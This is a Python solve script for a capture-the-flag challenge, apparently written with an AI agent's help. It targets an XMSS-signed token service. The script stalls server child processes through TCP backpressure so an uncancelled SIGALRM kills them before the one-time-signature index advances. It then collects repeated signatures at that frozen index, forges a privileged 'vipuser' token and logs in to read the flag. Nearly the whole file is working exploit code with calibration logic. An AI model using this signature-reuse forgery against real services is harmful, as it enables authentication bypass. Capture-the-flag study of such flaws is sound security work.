#!/usr/bin/env python3
"""НаПасеке v2 — GENTLE solve via SIGALRM stall (no server self-destruct).

INTENDED PATH (verified locally on the real kill-enabled build):
  utils.c:read_line arms alarm(20) before every read() and NEVER cancels it; server.c
  installs NO SIGALRM handler => SIGALRM's default action terminates ONLY that child.
  register_user order is: sign -> save -> write "HoneyPass token: " -> write token_hex
  -> write "\n" -> xmssmt_update_signing_key (advances the OTS index). If we make the
  child BLOCK in the token write (TCP backpressure) so it is still blocked ~20 s later,
  the leftover SIGALRM kills that child BEFORE update_signing_key runs => the OTS index
  is NOT advanced and the server never calls kill(-pgid) (no self-destruct).

  Repeat k>=2 times: every stalled child signs at the SAME frozen index under the SAME
  live key. We only need the 1684 signature bytes off the wire (the message/nick we
  chose, so we know it and re-append it). Then R*-grind forge (forge_grind_R) a vipuser
  token and log in.

CALIBRATION (see AGENT_FABLE_LOCALREPRO.md "STALL" section):
  - small client SO_RCVBUF + STOP reading => the child's send buffer fills.
  - pre-fill with N pipelined `K` (pubkey) responses (S_k≈376 B each) so the block lands
    INSIDE the token, AFTER the first 3368 sig-hex chars but BEFORE the token ends
    (so the whole token never flushes => update never runs => index frozen).
  - fixed 16-char nick => token = 3368 sig hex + 32 nick hex (widest 32-byte landing
    window). rcvbuf is the byte-level vernier; N_k is the coarse (376 B) knob.
  - real server send buffer autotunes to net.ipv4.tcp_wmem max (~4 MB): expect to pipe
    THOUSANDS of K to reach the block point, and calibrate PER CONNECTION (autotune drift).
  - MUST close cleanly (FIN, not RST): the child has to consume the whole pipeline before
    it blocks, else the RST discards the send buffer and the token is lost. Blocking in
    the LAST command's (R's) token write guarantees the recv queue is already drained.

DO NOT run against the live server casually — it holds ~20 s per stall and registers
throwaway nicks. Local only for validation.  Host/port/invite are CLI args.
"""

from __future__ import annotations

import argparse
import os
import re
import socket
import time

from forge_grind_R import SIG_BYTES, forge_vipuser_token  # SIG_BYTES=1684

SIG_HEX = SIG_BYTES * 2  # 3368
_TOK = re.compile(rb"HoneyPass token:\s*([0-9a-fA-F]+)")
_PK = re.compile(rb"XMSS-MD5\): ([0-9a-fA-F]+)")
_uid = [0]


def _nick():
    _uid[0] += 1
    s = "s%dq%d" % (int(time.time()) % 100000, _uid[0])
    return (s + "zzzzzzzzzzzzzzzz")[:16]  # fixed 16 chars => tokenlen = 3368 + 32 = 3400


def _drain(s, marker, to=6.0):
    s.settimeout(to)
    buf = b""
    while marker not in buf:
        try:
            c = s.recv(4096)
        except TimeoutError:
            return buf, False
        if not c:
            return buf, False
        buf += c
    return buf, True


class Solver:
    def __init__(self, host, port, invite, alarm_wait):
        self.host, self.port = host, port
        self.invite = invite.encode()
        self.alarm_wait = alarm_wait  # seconds to wait for SIGALRM (>= server alarm, ~21 live)
        self.tokenlen = 3400

    def pubkey(self):
        s = socket.create_connection((self.host, self.port), timeout=10)
        _drain(s, b"Invite code: ")
        s.sendall(self.invite + b"\n")
        _drain(s, b"Enter your choice: ")
        s.sendall(b"K\n")
        buf, _ = _drain(s, b"\n")
        s.close()
        match = _PK.search(buf)
        if match is None:
            raise ValueError("server response does not contain an XMSS public key")
        return bytes.fromhex(match.group(1).decode())

    def alive(self):
        try:
            s = socket.create_connection((self.host, self.port), timeout=6)
            _drain(s, b"Invite code: ")
            s.sendall(self.invite + b"\n")
            _drain(s, b"Enter your choice: ")
            s.sendall(b"K\n")
            _, ok = _drain(s, b"XMSS-MD5")
            s.close()
            return ok
        except OSError:
            return False

    def stall(self, n_k, nick, rcvbuf):
        """One stalled registration. Returns (sig_chars, idx8, close, full_recovered_hex)."""
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, rcvbuf)
        s.connect((self.host, self.port))
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        _drain(s, b"Invite code: ")
        s.sendall(self.invite + b"\n")
        _drain(s, b"Enter your choice: ")
        s.sendall((b"K\n" * n_k) + b"R\n" + nick.encode() + b"\n")
        time.sleep(self.alarm_wait)  # child blocks in token write, then SIGALRM
        s.settimeout(4)
        data = b""
        close = "FIN"
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                data += c
        except ConnectionResetError:
            close = "RST"
        except TimeoutError:
            close = "TIMEOUT"
        s.close()
        m = _TOK.search(data)
        h = m.group(1).decode() if m else ""
        return len(h), (h[:8] if h else None), close, h

    def calibrate_block_point(self, rcvbuf):
        """Find N_k such that N_k K-responses nearly fill the send buffer (block lands in
        the token). Doubles N until a K-only pipeline stops coming back clean, then backs
        off. Returns a starting N_k.
        """
        lo, hi = 1, 2
        while hi < 200000:
            sc, _idx, close, _ = self.stall(hi, _nick(), rcvbuf)
            # with the trailing R, a clean FIN + full/partial token means block was in R;
            # a RST means we filled up during the K-spam (too many) -> back off.
            if close == "RST" or sc == 0:
                hi = (lo + hi) // 2 if hi - lo > 1 else lo
                break
            if sc >= self.tokenlen:  # token fully fit -> need MORE K to push block in
                lo = hi
                hi *= 2
            else:  # block already inside token -> good ballpark
                break
        return max(1, hi)

    def collect(self, k, n_k, rcvbuf, max_tries=400):
        """Adaptive: keep the index frozen (never let the whole token through) while
        nudging rcvbuf so the block lands with >=3368 sig hex captured. Returns
        (list_of_sm_hex, idx8) for ONE frozen index, or (None, None).
        """
        # Drift-tolerant: the block point wanders per connection, so DON'T chase every
        # sample. Hold rcvbuf steady (each stall is an independent draw); only shrink when
        # the index actually advances (protect the frozen index), and widen only on a run
        # of too-early/RST blocks. Capture whenever a draw lands in [3368, tokenlen-1].
        by_idx, prev, rb, step = {}, None, rcvbuf, 12
        early_streak = 0
        for t in range(max_tries):
            nick = _nick()
            sc, idx, close, h = self.stall(n_k, nick, rb)
            advanced = idx is not None and prev is not None and idx != prev
            if idx is not None:
                prev = idx
            if advanced:
                by_idx.clear()  # captures were at the old index
                rb = max(500, rb - step)  # we let a whole token through -> shrink
                early_streak = 0
                continue
            if close == "FIN" and SIG_HEX <= sc <= self.tokenlen - 1:
                sm_hex = h[:SIG_HEX] + nick.encode().hex()  # sig(1684 B) || known nick
                by_idx.setdefault(idx, []).append(sm_hex)
                early_streak = 0
                print(
                    f"  [collect] try {t} rb={rb} CAPTURE idx={idx} chars={sc} "
                    f"({len(by_idx[idx])}/{k})"
                )
                if len(by_idx[idx]) >= k:
                    return by_idx[idx], idx
            elif sc < SIG_HEX or close == "RST":
                early_streak += 1
                if early_streak >= 4:  # persistently too early -> widen a bit
                    rb += step
                    early_streak = 0
            # sc == tokenlen but idx didn't move (rare) -> leave rb; next draw may land
        best = max(by_idx.items(), key=lambda kv: len(kv[1]), default=(None, []))
        return (best[1], best[0]) if best[1] else (None, None)

    def login_and_read(self, token_hex):
        s = socket.create_connection((self.host, self.port), timeout=12)
        _drain(s, b"Invite code: ")
        s.sendall(self.invite + b"\n")
        _drain(s, b"Enter your choice: ")
        s.sendall(b"L\n")
        _drain(s, b"HoneyPass token: ")
        s.sendall(token_hex.encode() + b"\n")
        d, _ = _drain(s, b"Enter your choice: ", 12)
        if b"Login successful" not in d:
            s.close()
            return None
        s.sendall(b"P\n")
        _drain(s, b"nickname): ")
        s.sendall(b"my\n")
        d, _ = _drain(s, b"Enter your choice: ", 12)
        s.close()
        return d

    def run(self, k=2, n_k=None, rcvbuf=1250):
        pk = self.pubkey()
        print(f"[+] pubkey root||seed = {pk.hex()}")
        if n_k is None:
            n_k = self.calibrate_block_point(rcvbuf)
        print(f"[+] using N_k={n_k} rcvbuf(start)={rcvbuf} alarm_wait={self.alarm_wait}s")
        sm_hexes, idx = self.collect(k, n_k, rcvbuf)
        if not sm_hexes or len(sm_hexes) < k:
            print("[-] failed to collect k sigs at a frozen index")
            return False
        print(f"[+] {len(sm_hexes)} sigs at frozen idx {idx}; server alive={self.alive()}")
        sigs = [bytes.fromhex(h) for h in sm_hexes]
        res = forge_vipuser_token(pk, sigs, verbose=True)
        if not res:
            print("[-] forge failed (retry with more sigs)")
            return False
        token, _r_star, tries = res
        print(f"[+] forged vipuser token, R* in {tries} tries")
        wall = self.login_and_read(token.hex())
        if wall is None:
            print("[-] login failed")
            return False
        print("[+] WALL:\n" + wall.decode(errors="replace"))
        return b"avito{" in wall or b"Flag is here" in wall


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="napaseke-m9ybjl6b.avitoctf.ru")
    ap.add_argument("--port", type=int, default=32012)
    ap.add_argument(
        "--invite",
        default=os.environ.get("NAPASEKE_INVITE"),
        help="challenge invite code (default: $NAPASEKE_INVITE)",
    )
    ap.add_argument(
        "--alarm-wait",
        type=float,
        default=21.0,
        help="seconds to wait per stall (>= server alarm(20); use ~3 for a local alarm(2) build)",
    )
    ap.add_argument("--k", type=int, default=2)
    ap.add_argument("--nk", type=int, default=None, help="K-spam count; None=auto-calibrate")
    ap.add_argument("--rcvbuf", type=int, default=1250)
    ap.add_argument("--go", action="store_true", help="required to actually connect")
    a = ap.parse_args()
    if not a.go:
        print("refusing to connect without --go (safety: do not hammer live infra)")
        return
    if not a.invite:
        ap.error("--invite or $NAPASEKE_INVITE is required")
    ok = Solver(a.host, a.port, a.invite, a.alarm_wait).run(a.k, a.nk, a.rcvbuf)
    print("SUCCESS" if ok else "FAILED")


if __name__ == "__main__":
    main()
